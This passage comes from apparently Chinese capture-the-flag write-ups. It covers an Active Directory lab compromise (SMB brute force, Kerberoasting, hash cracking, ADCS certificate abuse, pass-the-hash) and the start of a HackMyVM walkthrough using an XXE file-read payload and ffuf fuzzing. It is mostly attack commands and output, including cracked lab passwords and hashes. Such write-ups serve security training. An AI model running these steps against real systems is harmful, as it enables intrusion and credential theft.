class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# hydra -L username.txt  -P pass.txt 172.22.9.26 smb</span><br><span class=\"line\">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class=\"line\"></span><br><span class=\"line\">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 13:02:49</span><br><span class=\"line\">[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)</span><br><span class=\"line\">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class=\"line\">[DATA] max 1 task per 1 server, overall 1 task, 1236 login tries (l:309/p:4), ~1236 tries per task</span><br><span class=\"line\">[DATA] attacking smb://172.22.9.26:445/</span><br><span class=\"line\">[445][smb] host: 172.22.9.26   login: zhangjian   password: i9XDE02pLVf</span><br><span class=\"line\">[445][smb] host: 172.22.9.26   login: liupeng   password: fiAzGwEMgTY</span><br></pre></td></tr></table></figure>\n\n<p>然后进行Kerberoast攻击</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation</span><br><span class=\"line\">-------------------------------------  --------  --------  --------------------------  ---------  ----------</span><br><span class=\"line\">TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;</span><br><span class=\"line\">WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;</span><br><span class=\"line\">TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  &lt;never&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$d0a75403c0fd68eb28e523ec82bbcc13$5d435dfada83bc3decd547576a2e0e533633be1ba2ca116bf3944fce42987d3a695c18247303f24a3f5b295919ed0bd0a682c106b81a1e733cf5b27d8816b85b5506c6cd1c04a7eefb3a12f46c00f1483854c51afb647d8fd064e86bc839305531c7a2cd3639f0b79fe070b1c3d10135ee7fc258f1abecec4bcad5d82c3b6a1031235a312c34e669df79ad94ed4a5ddd19f8919e26d5cbe49108176f7a1f52b21a438be962732cd3c7dfbd709b3ee3b7f0ffd4f8817aef4da2ebd5f2339538a6ee44a6e455a0d0ef760238d871f2a01d742aadf0a6dab09e4dac1b37fa317ef49f0bc9ed332df6a15eceabb304cae0d04df2e349ea41f193c8c41c9bbc8876db2cb6edf7ea19dffcbaa75b2e8cc062d873b7697397ae963d8454d867983429b9a24371a2b7b2ded8bb30454fc5c0c92346d0a00f706a04a3fab6a4dd59760f53107727237a316546634868fc926f582409cad4b4ab5674ef0994c60a1256b9677b9069818967813c3cd508a71e6e10fef1ddcbec756bb24cd1ed1d47ba09bed8d199398bf40cb19ecb0298342ca5eb67091f99a66c1cf2b62cb2fea208df89e75245d570e3e6617889d2c3f65be9c64747c21b2cdae4d1f9b06bdd921c46668c433952d0297d575e04e053e33f6251407793efc6e781406a2342a82d4a1939538883c6dff90f8c7845e140332b37efc66cb4d38f7ad7a4d3c66ef6c2d20b56e8de9a5db8db344e18a72a86f7b0447752356e35f6bc97cf328221921735aa58772dc5b800db10ccd461c95783887ad9a065b7b360365b03e5966f9886fd4b5db3472db78c2a7f514f767984e2944a89912e7d4d0bc8c56e7043b9f4bcebe6ea9d1fe4a6715630f1362b2ae5bf62f25c45d3a9fe2ac85e61728c57d1940f21ed763c403d21794e80bace45f553be48d3d367616d735dfc517573d75a418518e90f28c621b3fc614c1e89a7a7a07056a6a849587666ea91dd6b649d7f73356b8c4807f453b0d3209a52f3b99f81012a76dd0ff159d968dd15ad4c7c035792cd1d56f7c537418a3b466b0f6fa2038b159999f2620b20e14f452d3dee9052fac011c78eb3bff235ea41f85aa82e56c8fca3c626a18255f47c40e3e20ddf3c34083f99e9005b61efaa61f939786a024a86e5f56ee1920a452f7f74a66f8ddbfac75eebfd468bc99b2266d2638d7fbf9dae6ba76b36f97cb452eee2bc129553b5c7725b1dc5a6f91a0d67e9cfb3079024ac0c7379a8b1f6eb76223d021233bf75b8279d7d4b01211dbd4b3baaa1c566b945fd757cbe0e8eee3f7ca8df0e2133848109d16df8fddf6b2e62922c9eca4c980cc6949ed145a146b7d1e2ca5fed6c1b378f4963afb15e8c02120467c33f3b30dec45c39da63c7f847513ea72614af712ccb867c6fb31fc135f9690d543a34f6bba84114d71915c021e9a8ade8a50a96c311940bd680e314f4bc8c5a90376b5a313000d497372e4278713368219da610794a1fe1ff560f6c36f4b31e70b63a06c8</span><br><span class=\"line\">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$756eb4d4a5fe99658d9e4329a03d65a5$7ac1c23cb3d99bb83a38e222924cacfb56f615a4f9b9024b7c8e0879221f744b82ca58662adb97a7a3aa3f7cc6a0095f1b3e8f1cbb2e89433341f2399b12841eba64593a74ce3d6ea849ed9dbb5bda3918470942af00817782299bcb2c44c5b9723aaecf746cf760466f47fdfe5aecf6586e249f0bf305d437747b27e29d2a78d78a897fdb0cfe05a903d35e8e8c31f74091fa6b0886ca297c5ae56b656a67f0dee88e9bcfc8f720f172bfcb8df630ad566a2118f7b862f460fb9a28afee2f3e92069bc8bd3862d0812e3fca7991d851238ca3872cb190d091e3cca90adf4da38d364bc759831d0e61fd2a17864389989b4b1dd49d6ddabc60619d6788947bea7ac1a6040e201e362cbefbff3adb78434a80c66511ef8860493dc94dea833b94bf9b6477a986485e4ee3ab05c91d1ab6ffb8679247bcbfea6c2b51fc15a4ce37ce815e2a7a6185ee09f3bcb05e0c3d31b65d642c3a8cf7546125d03260500675da2efe3c15c234a2bc9f5139a3612d521ad0e8315b3bcde7c3f628c723222c20d19937c8a3497ca4763326686a54c619c2d730e03a6a3247615f4ebde209c7a1e87c1c351fdbf16afb6268755646e14dd2f0ee14a977c4bf1ad0231fc7e4a33ec018e790b5a8d103c9a2ba9f8f0877929c54eda6ffcd936658f2e876273ba5eeef5066ea031c1176bbf365a88e8627f4143173155e5a93920e5722d93054ab1d3596fab388acca607372a94f427a2b7555d6d7e2a0fde397de943b9c34b9d2f9f552dea129a2e1120137ff2a2894e4f19725ad4b282c5be4fe370f428ab9ee0b7bcb30d5ab0a334726edd459ce838630ef6905f6a91640ea3096ca2ebe18691f956c7d017c437aa6219ba880d9948daf8738f30af06b5c6038763dbe9e4b6abf29cdb5ebd742fdf7b334817a29f4a927ce294db573acfb69a7b9b3d4b34e758d0ee3901633c13b15365b3aa50db5cd66ac1a83ed3230dcd3396510eed1554ef6dddd485ae97d4b2385a60833a104672a55b3740a8b57c1f9dfe167fe1e16c6f2c4446c3297ef067441a5a536db4697f979e246cb3abb5aa46a41cc140ccf89b23b503e5975f2cd845e4822a0b1d7b240d6c63e225278745e97c2e32ce7ca1efb2d911c4076911b78fe26adaf5d2289b5e0e76cb0ff50e20e61a8ff76cd0ea14275cb64cb34c219c7a9b4cea7fa0255848fecefa0849a32ffa14f3491e7f83ad092506f123b16df02eb00090e12b2bb5b60291ef8a9d57d6d3fd8505ddf799fa0a56e6309b03f372002090da40e7419e75629c0b518ac4d011b709fcf7866c1a581b7e0a5ac0ae28af906d7b95334c1098eeb3ec94a4e3623b72f60a53182d6f02d60790642400e687954328e1224c473bf010f3c73fd3184269f4cf3d9cb91178a962cb085f3dd45abb794437fbb348904fb12440e7c6ed237d97422ddbde2b0ef6c912a4c4ff86b4153a266f103dd9d69b8806d44e57f0271fa6db4b6b02021a0bdd55ee38323fc9f8d7bbb0a8b</span><br></pre></td></tr></table></figure>\n\n<p>可以拿到两个用户的hash，用hashcat爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat  hash /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# hashcat  hash --show</span><br><span class=\"line\">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class=\"line\">The following mode was auto-detected as the only one matching your input hash:</span><br><span class=\"line\"></span><br><span class=\"line\">13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol</span><br><span class=\"line\"></span><br><span class=\"line\">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class=\"line\">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class=\"line\"></span><br><span class=\"line\">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2fef93477c96377b81b856c0a918b0f8$7b12ec73692a807cdb959eaeabd253a016b9a6617e9e882016aeba5e5c1f28e4e1d9bb1ce3cfedba110b3c628726b1b50585672544354fae17ec956eff2e27c39494cf3a08d7ab530114273c7d2332866c1483791d6a32b0fea66422abd61412b64b6bd672e30cf844a1da47c8c1cf6791e00abadb34423301ead5ba16fd13631a7a2e29bafaaa9d55a6f9063ef06838953339018d2a077e7c4db47fec5c341c2c53562bf772bd047f5035aade21b9c0c2ad8dc1eec04aa2a1f9e120c6f1508b734895b0ac1cf384ee3b01ffc723b963826221c291f0fbedf92c8f42d549c611b547d1a5bd2cb93c149b8fb01ecc0d785ca8615d49f2d77015c4431d3a122d723936f57e7abb137ce18d22ced5690de6fc3daa6c45f81f97a4427a8c9adb6665eb3ed0010961f38a8860aaaba72a49b67ec435f7ada78ccab514b6c4e465bf0a9b3c14f3e62f580b79d811d2814e3c952dd9a7cacf451632035e1f819a0289913b6f536d317a920b025da509fec7ad356b4d62d892080a87274e2cda87823971f719275afa7b00615cb43e00c586dc09d2f48d909944d352ef0f1b96b74e924c33b4d7a71618c6aaeea94c7b1b61fdc3cbda2b3a0074942a982e7c63258b58ffc74ca532760ad3da4d1b3f5275330457877de4d840477b03c1dbef4ab68bfbfc0400bb63082c9fdc3ca13cc89a8b91846e06d69a8d713aa7e184cc7ed888df935d42580969a9bb00fd61887bd7c55eca669e14ef8705fcb9d5515218c991935c5b37973b363ba58453543a7033e1869d6e1f4304c1887274b04bbe3bea1a24556698ba5fb21218100cfbd73fc5d09e424786f6e64b39e36c7d86b751c502d9f101a368e575c0be0fe4660db85b5d8c13af3c06c870bf3db18e9e7056256d29b153fc6724f6778c8502b763178a34d1fcd67c172d9a943f0a55b972b0d68f0d9507cfbd8acac33d5b340c6db1728a6ff79537e91c9fde40764b79448cf5f122080d770a860baf50a76a08076ac52de4d671cc8bd84f79bda7c0a52988b62a2954f7fe274ab0ad008cdbf8c3710d7d9cd263d9479c3309de5fec18ce56758e056dcfd942500adea9a14da3555e29e9277f8ca07af73299f70472137f7cd045b60f639f14b3bcfcf635c4ec0c0359c4d7238121af36fa7fb29316d4a45890c0973e432fb2b617256cfeec85c8496c506e79c31e4507eaf5ecc7d67540eed5fec810cdcf6d1682156597450c27b27ad617fdf0fd03abe04d181e58cec2af1edc85e243102c8db404aaaca939c42a54d633585eb7e26348ff26951c5cc8c6271d227520fdea38033174b4efddf6a589688223b263e8808fdbc85bbe20ea471fb529216d802776dcc3a7ef68334059213d49640da993c067719c0b119f9c3914295dedefcbd89f0facf3ba3700227de362e49f88302bf87e4cfc5787b364951e3301efa5ff817f5dbf372536ec3aa4:@Passw0rd@</span><br></pre></td></tr></table></figure>\n\n<p>然后用<code>chenchen@xiaorang.lab:@Passw0rd@</code>进行远程桌面登录,用bloodhound进行信息搜集（其实也不用，因为之前fscan已经扫到洞了）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# bloodhound-python -u chenchen -p @Passw0rd@ -d xiaorang.lab  -c all --dns-tcp -ns 172.22.9.7 --auth-method ntlm --zip</span><br><span class=\"line\">INFO: Found AD domain: xiaorang.lab</span><br><span class=\"line\">INFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab</span><br><span class=\"line\">INFO: Found 1 domains</span><br><span class=\"line\">INFO: Found 1 domains in the forest</span><br><span class=\"line\">INFO: Found 2 computers</span><br><span class=\"line\">INFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab</span><br><span class=\"line\">INFO: Found 95 users</span><br><span class=\"line\">INFO: Found 52 groups</span><br><span class=\"line\">INFO: Found 2 gpos</span><br><span class=\"line\">INFO: Found 1 ous</span><br><span class=\"line\">INFO: Found 19 containers</span><br><span class=\"line\">INFO: Found 0 trusts</span><br><span class=\"line\">INFO: Starting computer enumeration with 10 workers</span><br><span class=\"line\">INFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.lab</span><br><span class=\"line\">INFO: Querying computer: XIAORANG-DC.xiaorang.lab</span><br><span class=\"line\">INFO: Done in 00M 06S</span><br><span class=\"line\">INFO: Compressing output into 20250416132802_bloodhound.zip</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>上传Certify.exe查找易受攻击的证书</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\chenchen\\Desktop\\新建文件夹&gt;Certify.exe find /vulnerable</span><br><span class=\"line\"></span><br><span class=\"line\">   _____          _   _  __</span><br><span class=\"line\">  / ____|        | | (_)/ _|</span><br><span class=\"line\"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class=\"line\"> | |    / _ \\ &#x27;__| __| |  _| | | |</span><br><span class=\"line\"> | |___|  __/ |  | |_| | | | |_| |</span><br><span class=\"line\">  \\_____\\___|_|   \\__|_|_|  \\__, |</span><br><span class=\"line\">                             __/ |</span><br><span class=\"line\">                            |___./</span><br><span class=\"line\">  v1.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Action: Find certificate templates</span><br><span class=\"line\">[*] Using the search base &#x27;CN=Configuration,DC=xiaorang,DC=lab&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Listing info about the Enterprise CA &#x27;xiaorang-XIAORANG-DC-CA&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    Enterprise CA Name            : xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    DNS Hostname                  : XIAORANG-DC.xiaorang.lab</span><br><span class=\"line\">    FullName                      : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class=\"line\">    Cert SubjectName              : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class=\"line\">    Cert Thumbprint               : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E</span><br><span class=\"line\">    Cert Serial                   : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class=\"line\">    Cert Start Date               : 2023/7/14 12:33:21</span><br><span class=\"line\">    Cert End Date                 : 2028/7/14 12:43:21</span><br><span class=\"line\">    Cert Chain                    : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab</span><br><span class=\"line\">    UserSpecifiedSAN              : Disabled</span><br><span class=\"line\">    CA Permissions                :</span><br><span class=\"line\">      Owner: BUILTIN\\Administrators        S-1-5-32-544</span><br><span class=\"line\"></span><br><span class=\"line\">      Access Rights                                     Principal</span><br><span class=\"line\"></span><br><span class=\"line\">      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">    Enrollment Agent Restrictions : None</span><br><span class=\"line\"></span><br><span class=\"line\">[!] Vulnerable Certificates Templates :</span><br><span class=\"line\"></span><br><span class=\"line\">    CA Name                               : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    Template Name                         : XR Manager</span><br><span class=\"line\">    Schema Version                        : 2</span><br><span class=\"line\">    Validity Period                       : 1 year</span><br><span class=\"line\">    Renewal Period                        : 6 weeks</span><br><span class=\"line\">    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</span><br><span class=\"line\">    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS</span><br><span class=\"line\">    Authorized Signatures Required        : 0</span><br><span class=\"line\">    pkiextendedkeyusage                   : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class=\"line\">    mspki-certificate-application-policy  : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class=\"line\">    Permissions</span><br><span class=\"line\">      Enrollment Permissions</span><br><span class=\"line\">        Enrollment Rights           : NT AUTHORITY\\Authenticated UsersS-1-5-11</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Domain Users         S-1-5-21-990187620-235975882-534697781-513</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">      Object Control Permissions</span><br><span class=\"line\">        Owner                       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">        WriteOwner Principals       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">        WriteDacl Principals        : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">        WriteProperty Principals    : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Certify completed in 00:00:10.1629693</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CA Name                               : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">Template Name                         : XR Manage</span><br></pre></td></tr></table></figure>\n\n<p>这个可以打</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -t</span><br><span class=\"line\">emplate &#x27;XR Manager&#x27;  -upn administrator@xiaorang.lab</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting certificate via RPC</span><br><span class=\"line\">[*] Successfully requested certificate</span><br><span class=\"line\">[*] Request ID is 7</span><br><span class=\"line\">[*] Got certificate with UPN &#x27;administrator@xiaorang.lab&#x27;</span><br><span class=\"line\">[*] Certificate has no object SID</span><br><span class=\"line\">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using principal: administrator@xiaorang.lab</span><br><span class=\"line\">[*] Trying to get TGT...</span><br><span class=\"line\">[*] Got TGT</span><br><span class=\"line\">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class=\"line\">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class=\"line\">[*] Got hash for &#x27;administrator@xiaorang.lab&#x27;: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</span><br></pre></td></tr></table></figure>\n\n<p>得到了administrator的哈希了，拿下域控了，直接登录这台主机和域控拿flag即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-wmiexec  --hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.26</span><br></pre></td></tr></table></figure>\n\n","categories":["春秋云镜"],"tags":["靶机"]},{"title":"HackmyVM-system","url":"/2025/04/17/Hackmyvm-system/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>arp-scan -l</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.2    08:00:27:72:be:a6       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.141  08:00:27:27:28:54       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>\n\n<p>192.168.31.141就是靶机ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.141</span><br><span class=\"line\">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 03:39 EDT</span><br><span class=\"line\">Nmap scan report for 192.168.31.141</span><br><span class=\"line\">Host is up (0.0029s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 08:00:27:27:28:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><p>有一个登录的页面，通过查看请求头可以发现他是以xml的格式传输的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;details&gt;&lt;email&gt;123@123.com&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>\n\n<p>试一试xxe注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE test [ </span><br><span class=\"line\">&lt;!ENTITY test1 SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class=\"line\">]&gt;&lt;details&gt;&lt;email&gt;$test1;&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;p align=&#x27;center&#x27;&gt; &lt;font color=white size=&#x27;5pt&#x27;&gt; root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class=\"line\">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class=\"line\">david:x:1000:1000::/home/david:/bin/bash</span><br><span class=\"line\"> is already registered! &lt;/font&gt; &lt;/p&gt;</span><br></pre></td></tr></table></figure>\n\n<p>读取david用户的私钥尝试登录，但是会登录失败，通过fuzz可以知道/home/david还有一个.viminfo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.31.141/magic.php  -d &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/david/FUZZ&quot;&gt; ]&gt; &lt;details&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;das&lt;/password&gt;&lt;/details&gt;&#x27; --fw 11</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> # This viminfo file was generated by Vim 8.2.</span><br><span class=\"line\"># You may edit it if you&#x27;re careful!</span><br><span class=\"line\"></span><br><span class=\"line\"># Viminfo version</span><br><span class=\"line\">|1,4</span><br><span class=\"line\"></span><br><span class=\"line\"># Value of &#x27;encoding&#x27; when this file was written</span><br><span class=\"line\">*encoding=utf-8</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># hlsearch on (H) or off (h):</span><br><span class=\"line\">~h</span><br><span class=\"line\"># Command Line History (newest to oldest):</span><br><span class=\"line\">:wq!</span><br><span class=\"line\">|2,0,1648909714,,&quot;wq!&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Search String History (newest to oldest):</span><br><span class=\"line\"></span><br><span class=\"line\"># Expression History (newest to oldest):</span><br><span class=\"line\"></span><br><span class=\"line\"># Input Line History (newest to oldest):</span><br><span class=\"line\"></span><br><span class=\"line\"># Debug Line History (newest to oldest):</span><br><span class=\"line\"></span><br><span class=\"line\"># Registers:</span><br><span class=\"line\"></span><br><span class=\"line\"># Password file Created:</span><br><span class=\"line\">&#x27;0  1  3  /usr/local/etc/mypass.txt</span><br><span class=\"line\">|4,48,1,3,1648909714,&quot;/usr/local/etc/mypass.txt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># History of marks within files (newest to oldest):</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; /usr/local/etc/mypass.txt</span><br><span class=\"line\">\t*\t1648909713\t0</span><br><span class=\"line\">\t&quot;\t1\t3</span><br><span 